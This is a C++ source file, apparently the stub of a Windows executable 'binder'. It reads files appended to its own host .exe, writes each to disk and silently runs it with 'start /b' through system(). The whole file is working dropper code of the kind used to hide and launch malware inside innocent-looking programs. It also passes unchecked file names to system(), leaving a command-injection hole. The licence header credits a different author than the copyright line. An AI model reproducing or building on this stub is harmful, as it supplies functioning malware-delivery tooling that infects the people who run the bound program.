/*
* stub.h - a class for Microsoft Visual Studio
*
* Copyright (C) 2014 John Wang
*
* Permission is hereby granted, free of charge, to any person obtaining
* a copy of this software and associated documentation files (the
* ``Software''), to deal in the Software without restriction, including
* without limitation the rights to use, copy, modify, merge, publish,
* distribute, sublicense, and/or sell copies of the Software, and to
* permit persons to whom the Software is furnished to do so, subject to
* the following conditions:
*
* The above copyright notice and this permission notice shall be included
* in all copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED ``AS IS'', WITHOUT WARRANTY OF ANY KIND, EXPRESS
* OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
* MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
* IN NO EVENT SHALL TONI RONKKO BE LIABLE FOR ANY CLAIM, DAMAGES OR
* OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
* ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
* OTHER DEALINGS IN THE SOFTWARE.
*
* $Id: stub.h,v 1.0 2014/12/12 12:00 Taoyuan Taiwan $
*/
#define _CRT_SECURE_NO_WARNINGS

#include "stub.h"
#include <Windows.h>

/* @constructor */
Stub::Stub() {
	fileName = nullptr;
	file = nullptr;
}

/**
 * Set the destination host file name.
 *
 * @param {char*} fName the name of the destiantion host file.
 * @return {bool} return true if the destination host file name
 * is set successfully, return false otherwise.
 */
bool Stub::setFileName(char *fName) {
	if (checkExeFileNameFormat(fName) && (file = fopen(fName, "rb"))) {
		fileName = new char[strlen(fName) + 1];
		fileName[strlen(fName)] = '\0';
		strcpy(fileName, fName);

		return true;
	}
	else {
		return false;
	}
}

/**
 * Check if the destination host file name is set or not.
 *
 * @return {bool} return true if the destination host file name
 * has already been set, return false otherwise.
 */
bool Stub::isSetFileName() {
	if (fileName == nullptr) {
		return false;
	}
	else {
		return true;
	}
}

/**
 * Extract and execute all binded file from destination host file.
 *
 * @return {bool} return true if this method is succeeded, return
 * false otherwise.
 */
bool Stub::extractAndExecute() {
	if (isSetFileName()) {
		char *buffer = nullptr;
		char *currentFileName = nullptr;
		char *command = nullptr;
		unsigned long recordPosition = 0;
		unsigned long size = 0;
		unsigned long currentFilePosition = 0;
		unsigned long currentFileSize = 0;

		// Get host file size in bytes.
		fseek(file, 0, SEEK_END);
		size = ftell(file);
		rewind(file);

		// Load host file data into memory in bytes.
		buffer = new char[size + 1];
		buffer[size] = '\0';
		fread(buffer, size, 1, file);

		// Get the position of record which stores the information of binded files.
		recordPosition = readRecordPosition(buffer, size);
		// Now read all records.
		readRecord(buffer, recordPosition);

		// Create all binded files and execute it.
		while (!nameRecord.empty()) {
			currentFileName = nameRecord.back();
			currentFilePosition = positionRecord.back();
			currentFileSize = sizeRecord.back();

			if (createFile(currentFileName, buffer + currentFilePosition, currentFileSize)) {
				command = new char[strlen(currentFileName) + 10];
				strcpy(command, "start /b ");
				strcat(command, currentFileName);
				strcat(command, "\0");
				system(command);
			}
			else {
				std::cout << currentFileName << " could not be created." << std::endl;
			}

			nameRecord.pop_back();
			positionRecord.pop_back();
			sizeRecord.pop_back();
		}	

		return true;
	}
	else {
		return false;
	}
}

/* @destructor */
Stub::~Stub() {
	if (file != nullptr) {
		fclose(file);
	}
	delete[] fileName;
	fileName = nullptr;
	file = nullptr;
}

/**
* Checking if the target file is an .exe file or not.
*
* @param {char*} fileName the name of file to be checked.
* @return {bool} return true if the target file is an .exe
* file, return false otherwise.
*/
bool Stub::checkExeFileNameFormat(char *fileName) {
	int length = std::strlen(fileName);

	if (length > 4 &&
		fileName[length - 4] == '.' &&
		fileName[length - 3] == 'e' &&
		fileName[length - 2] == 'x' &&
		fileName[length - 1] == 'e') {
		return true;
	}
	else {
		return false;
	}
}

/**
 * Read the position of binding record which stores all information about
 * binded files.
 *
 * @param {char*} buffer the pointer to the raw data of destination host
 * file in binary.
 * @param {unsigned long} size the size of the raw data.
 * @return {unsigned long} the position of binding record in destination
 * host file.
 */
unsigned long Stub::readRecordPosition(char *buffer, unsigned long size) {
	unsigned long position = size - 1;
	unsigned long result = 0;

	while (buffer[position] != '!') {
		position -= 1;
	}

	position += 1;

	result = atol(buffer + position);

	return result;
}

/**
 * Read all binding record and store these information into Stub.
 *
 * @param {char*} buffer the pointer to the raw data of destination host
 * file in binary.
 * @param {unsigned long} recordPosition the start position of the
 * binding record.
 */
void Stub::readRecord(char *buffer, unsigned long recordPosition) {
	unsigned long position = recordPosition;
	char *currentData = nullptr;
	
	while (buffer[position] != '!') {
		// Reading file name.
		currentData = readSingleRecordData(buffer, position);
		nameRecord.push_back(currentData);
		position += strlen(currentData) + 1;

		// Reading position of data of current file in bytes.
		currentData = readSingleRecordData(buffer, position);
		positionRecord.push_back(atol(currentData));
		position += strlen(currentData) + 1;

		// Reading the size of current file in bytes.
		currentData = readSingleRecordData(buffer, position);
		sizeRecord.push_back(atol(currentData));
		position += strlen(currentData) + 1;
	}
}

/**
 * Read a block of binding record which stores information about
 * one binded file in destination host file.
 * One binded file has 3 blocks of record:
 * - File name.
 * - Beginning position in destination host file.
 * - Size (in bytes).
 *
 * @param {char*} buffer the pointer to the raw data of destination host
 * file in binary.
 * @param {unsigned long} position the beginning of a block of binding
 * record.
 * @return {char*} pointer to the read information.
 */
char *Stub::readSingleRecordData(char* buffer, unsigned long position) {
	char *ptr = buffer + position;
	char *result = nullptr;
	int length = strlen(ptr);

	result = new char[length + 1];
	result[length] = '\0';
	strcpy(result, ptr);

	return result;
}

/**
 * Create a new empty file and write raw data into this empty file.
 *
 * @param {char*} fileName the name of this newly created file will be.
 * @param {char*} data the raw data to be written into this file.
 * @param {unsigned long} size the size (in bytes) of the raw data.
 * @return {bool} return true if file created successfully, return
 * false otherwise.
 */
bool Stub::createFile(char* fileName, char* data, unsigned long size) {
	FILE *f = nullptr;
	
	if (f = fopen(fileName, "wb+")) {
		fwrite(data, size, 1, f);
		fclose(f);
		
		return true;
	}
	else {
		return false;
	}
}